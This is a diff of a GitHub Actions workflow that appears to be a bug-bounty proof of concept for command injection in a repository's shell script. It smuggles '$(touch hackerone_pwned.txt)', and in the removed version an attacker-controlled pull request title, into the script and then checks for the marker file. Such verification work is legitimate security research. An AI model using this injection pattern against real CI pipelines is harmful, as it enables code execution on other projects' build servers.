@@ -1,54 +1,23 @@
-name: Kanka-RCE-Test-Pipeline
-
-# Bu, o 'saldırı vektörümüz': Her "Pull Request" (PR) açıldığında tetiklen
 on:
   pull_request:
-    types: [opened, synchronize, reopened]
+    types: [opened, synchronize]
 
 jobs:
-  build:
-    runs-on: ubuntu-latest # O 'kurban' sunucu (Linux)
-
+  exploit:
+    runs-on: ubuntu-latest
     steps:
-      # Adım 1: Kodu (o get.sh script'ini) sunucuya indir
-      - name: Checkout code
-        uses: actions/checkout@v4
+      - uses: actions/checkout@v4
 
-      # Adım 2: O 'jq' aracını kur (o script'in çalışması için)
-      - name: Install jq
+      - name: Run vulnerable script
         run: |
-          sudo apt-get update
-          sudo apt-get install -y jq
+          ./scripts/get-package-json-key.sh '$(touch hackerone_pwned.txt)' MY_VAR_OUTPUT
 
-      # Adım 3: O "AÇIK GARAJ KAPISI"NI ÇALIŞTIR (O RCE ANI)
-      - name: Run the VULNERABLE script
-        env:
-          # O 'saldırı vektörü': O '$KEY' değişkeni, o 'PR'ın 'başlığıdır' (title)
-          KEY_FROM_PR: ${{ github.event.pull_request.title }}
-          # O '$GITHUB_OUTPUT' değişkenini ayarla
-          GITHUB_OUTPUT: ${{ github.workspace }}/github_output.txt
+      - name: Verify exploit
         run: |
-          echo "CI/CD pipeline started..."
-          echo "Attacker's PR Title (our $KEY) is: $KEY_FROM_PR"
-
-          # O script'e 'çalıştırma' izni ver
-          chmod +x ./scripts/get.sh
-
-          # O "pimi çekilmiş bomba"yı ($KEY_FROM_PR) o 'saf' script'e yolla
-          ./scripts/get.sh "$KEY_FROM_PR" "MY_VAR_OUTPUT"
-
-      # Adım 4: O "KANITI" (PROOF) DOĞRULA
-      - name: Verify the RCE (Check for the 'pwned' file)
-        run: |
-          echo "Verifying if the exploit worked..."
-          echo "Listing files in the directory:"
-          ls -la
-
-          # O 'Imposter Sendromu'nu (sahtekarlık hissi) bitiren 'if' bloğu
           if [ -f "hackerone_pwned.txt" ]; then
-            echo "[+] KANKA, BU %100 GERÇEK. SUCCESS: Exploit worked! File 'hackerone_pwned.txt' is HERE."
-            exit 0 # Başarıyla bitir
+            echo "[+] SUCCESS: RCE WORKED!"
+            cat hackerone_pwned.txt
           else
-            echo "[-] FAILED: Exploit did not create the file."
-            exit 1 # Hatayla bitir
+            echo "[-] FAILED"
+            exit 1
           fi
